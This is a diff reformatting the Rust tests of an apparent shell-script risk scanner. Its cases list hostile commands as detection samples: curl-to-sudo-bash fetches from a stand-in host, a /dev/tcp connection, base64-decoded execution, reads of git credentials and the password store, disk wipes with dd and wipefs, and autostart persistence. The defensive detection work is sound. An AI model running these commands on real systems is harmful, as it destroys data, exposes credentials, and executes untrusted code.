@@ -1015,14 +1015,29 @@ mod tests {
     #[test]
     fn common_variants_of_each_rule_are_caught() {
         let cases: &[(&str, RuleId)] = &[
-            ("curl -fsSL https://x.test/i | sudo bash", RuleId::DownloadAndExecute),
-            ("curl -fsSL https://x.test/i |/bin/sh", RuleId::DownloadAndExecute),
+            (
+                "curl -fsSL https://x.test/i | sudo bash",
+                RuleId::DownloadAndExecute,
+            ),
+            (
+                "curl -fsSL https://x.test/i |/bin/sh",
+                RuleId::DownloadAndExecute,
+            ),
             ("sh <(curl -s https://x.test/i)", RuleId::DownloadAndExecute),
-            ("bash -c \"$(wget -qO- https://x.test/i)\"", RuleId::DownloadAndExecute),
-            ("aria2c -o - https://x.test/i | sh", RuleId::DownloadAndExecute),
+            (
+                "bash -c \"$(wget -qO- https://x.test/i)\"",
+                RuleId::DownloadAndExecute,
+            ),
+            (
+                "aria2c -o - https://x.test/i | sh",
+                RuleId::DownloadAndExecute,
+            ),
             ("exec 3<>/dev/tcp/10.0.0.1/4444", RuleId::DownloadAndExecute),
             ("echo aGk= | base64 -d|sh", RuleId::EncodedCommandExecution),
-            ("echo aGk= | base64 -di | sudo bash", RuleId::EncodedCommandExecution),
+            (
+                "echo aGk= | base64 -di | sudo bash",
+                RuleId::EncodedCommandExecution,
+            ),
             ("xxd -r -p payload | bash", RuleId::EncodedCommandExecution),
             ("doas pacman -U x", RuleId::PrivilegeEscalation),
             ("run0 systemctl enable x", RuleId::PrivilegeEscalation),
@@ -1031,15 +1046,34 @@ mod tests {
             ("cat ~/.git-credentials", RuleId::CredentialFileAccess),
             ("tar c ~/.password-store", RuleId::CredentialFileAccess),
             ("exec-once = ~/.cache/x", RuleId::PersistenceModification),
-            ("cp x ~/.config/omarchy/hooks/post-update", RuleId::PersistenceModification),
-            ("cp p $pkgdirZ$HOME/.config/autostart/x.desktop", RuleId::PersistenceModification),
-            ("dd of=/dev/sda if=/dev/zero", RuleId::DestructiveSystemOperation),
+            (
+                "cp x ~/.config/omarchy/hooks/post-update",
+                RuleId::PersistenceModification,
+            ),
+            (
+                "cp p $pkgdirZ$HOME/.config/autostart/x.desktop",
+                RuleId::PersistenceModification,
+            ),
+            (
+                "dd of=/dev/sda if=/dev/zero",
+                RuleId::DestructiveSystemOperation,
+            ),
             ("wipefs -a /dev/nvme0n1", RuleId::DestructiveSystemOperation),
-            ("__import__('os').system('id')", RuleId::ShellCommandExecution),
-            ("subprocess.check_output(cmd, shell=True)", RuleId::ShellCommandExecution),
+            (
+                "__import__('os').system('id')",
+                RuleId::ShellCommandExecution,
+            ),
+            (
+                "subprocess.check_output(cmd, shell=True)",
+                RuleId::ShellCommandExecution,
+            ),
         ];
         for (line, rule) in cases {
-            assert!(rules_for(line).contains(rule), "{line}: {:?}", rules_for(line));
+            assert!(
+                rules_for(line).contains(rule),
+                "{line}: {:?}",
+                rules_for(line)
+            );
         }
         for line in [
             "install -Dm644 x.desktop \"$pkgdir\"/etc/xdg/autostart/x.desktop",
